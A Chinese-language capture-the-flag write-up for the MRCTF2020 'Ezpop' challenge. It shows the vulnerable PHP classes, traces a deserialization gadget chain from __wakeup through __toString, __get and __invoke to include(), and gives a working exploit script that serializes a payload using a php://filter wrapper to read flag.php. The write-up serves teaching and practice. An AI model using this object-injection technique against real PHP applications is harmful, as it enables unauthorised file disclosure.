# [MRCTF2020]Ezpop

## 知识点

`php反序列化`

`preg_replace调用__toString`

## 解题

```php
<?php

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

魔术方法`__invoke`被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。`Test`类中的`__get()`方法可以调用

```php
public function __get($key){
    $function = $this->p;
    return $function();
}
```

`__get`方法又需要访问类中不存在的变量时调用，那就需要寻找和调用属性相关的代码。`Show`类中的`__toString()`方法可以调用

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

魔术方法`__toString`在类被当做一个字符串处理时会被自动调用，在魔术方法`__wakeup`则将属性`source`传入正则匹配函数`preg_match()`，在这个函数中`source`属性就被当做字符串处理。最终这个魔术方法_`_wakeup`又在类被反序列化时自动调用

`反序列化`->`调用Show类中魔术方法__wakeup`->`preg_match()函数对Show类的属性source处理-`>`调用Show类中魔术方法__toString`->`返回Show类的属性str中的属性source(此时这里属性source并不存在)`->`调用Test类中魔术方法__get`->`返回Test类的属性p的函数调用结果`->`调用Modifier类中魔术方法__invoke`->`include()函数包含目标文件(flag.php)`

`exp`

```php
<?php

class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$a = new Show();
$b = new Show();
$b->str = new Test();
$b->str->p = new Modifier();
$a->source = $b;

echo serialize($a);
echo urlencode(serialize($a));
```

